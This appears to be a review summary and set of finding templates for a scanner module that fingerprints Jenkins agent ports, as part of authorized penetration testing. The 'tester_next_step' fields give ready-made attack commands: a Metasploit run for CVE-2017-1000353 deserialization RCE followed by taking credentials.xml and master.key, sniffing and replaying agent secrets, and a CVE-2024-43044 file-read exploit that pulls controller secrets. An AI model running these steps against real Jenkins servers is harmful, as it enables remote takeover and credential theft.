summary: Solid Jenkins agent-listener discovery module: disambiguates 50000/tcp from IBM Db2/DRDA, negotiates the supported protocol set via an invalid-protocol trigger, and cross-links to the HTTP sibling /tcpSlaveAgentListener/ for X-Jenkins-Version + X-Instance-Identity fingerprint. Legacy-protocol / plaintext-JNLP / CLI-over-agent are proper T1s (deterministic negotiated-set membership). Two version-gated CVEs (CVE-2017-1000353, CVE-2024-43044) are T0 — version compare only, no exploit trigger. Biggest missing depth: no JNLP handshake completion → no CVE-2024-43044 fetchJar arbitrary-file-read PoC, no CLI2 deserialization PoC, no captured agent-secret validation. Instance-identity fingerprint is captured but not used to correlate captured agent secrets to controllers.

findings.tier_evidence: Negotiation succeeded — enum baseline with protocol set as data.
Legacy names present in the returned protocol set — deterministic.
findings.promotion_notes: T2 = complete a JNLP1/2 handshake and prove the plaintext secret path, or attempt JNLP3 replay. Complex JNLP handshake implementation.
findings.tester_next_step: Use jenkins-jnlp-agent.jar or a scapy-scripted JNLP1 handshake with a captured secret; confirm the controller accepts.

findings.title_pattern: Jenkins JNLP plaintext agent channel (secret on wire)
findings.tier_evidence: JNLP1/JNLP2 in negotiated set — implies plaintext secret transport.
findings.promotion_notes: T3 = on-path capture of the 64-hex agent secret on next agent reconnect; replay to complete handshake as that agent; then CVE-2024-43044 fetchJar for controller file read. Requires L2 on the agent LAN.
findings.tester_next_step: tcpdump -i any -A 'tcp port 50000' — wait for an agent reconnect; grep for 64-hex secret. Replay via jenkins-jnlp-agent.jar with that secret + captured node name.

findings.title_pattern: Jenkins CLI over agent port (CVE-2017-1000353 pre-auth Java deserialization RCE)
findings.tier_evidence: CLI2-connect / CLI-connect in the negotiated set — deterministic precondition for CVE-2017-1000353. No exploit payload sent.
findings.promotion_notes: T3 = deliver a ysoserial CommonsCollections gadget via CLI upload; landing gives pre-auth RCE as the Jenkins controller. Destructive/detected; needs Metasploit or a hand-crafted gadget.
findings.tester_next_step: msfconsole -q -x 'use exploit/linux/misc/jenkins_command_receive; set RHOSTS <ip>; set RPORT 50000; set LHOST <lhost>; run' — then whoami/id, exfil credentials.xml + master.key.

findings.tier_evidence: HTTP sibling GET returned X-Jenkins*/X-Instance-Identity headers — deterministic.
findings.promotion_notes: T2 = walk /manage /script /login on the HTTP twin for further unauth surface; probe /queue/api/json for CI job disclosure.
findings.tester_next_step: curl -sk http://<ip>:8080/tcpSlaveAgentListener/ -I; then curl -sk http://<ip>:8080/asynchPeople/api/json (unauth user list on many installs).

findings.title_pattern: Jenkins controller identity (X-Instance-Identity SPKI fingerprint) captured
findings.tier_evidence: SHA-256 of published public-key bytes — correlation data, no exploit.
findings.promotion_notes: Belongs in a known_instance_identities shared surface for multi-scan correlation.
findings.tester_next_step: Store fingerprint alongside every captured agent secret; correlate reuse across IPs/subnets.

findings.title_pattern: Jenkins version propagated from HTTP twin onto agent port
findings.tier_evidence: Version copied from X-Jenkins header — enum only.
findings.tester_next_step: Note version; check against SECURITY-* bulletins.

findings.tier_evidence: Version compare only — no fetchJar call attempted.
findings.promotion_notes: T3 = complete JNLP4 handshake (needs valid agent secret or plaintext-JNLP capture), then invoke ClassLoaderProxy#fetchJar with /var/lib/jenkins/secrets/master.key /var/lib/jenkins/credentials.xml — full controller compromise. Public PoCs exist.
findings.tester_next_step: python3 jenkins_43044_exploit.py --host <ip> --port 50000 --agent <name> --secret <64hex> --file /var/lib/jenkins/secrets/master.key — extract, then decrypt credentials.xml offline.

findings.tier_evidence: Version compare only — fires when CLI2 not directly seen but version predates fix.
findings.promotion_notes: Same T3 as jnlp_cli2_deser_rce; version-only variant triggers when negotiation didn't confess CLI2 but old build is likely to have it.
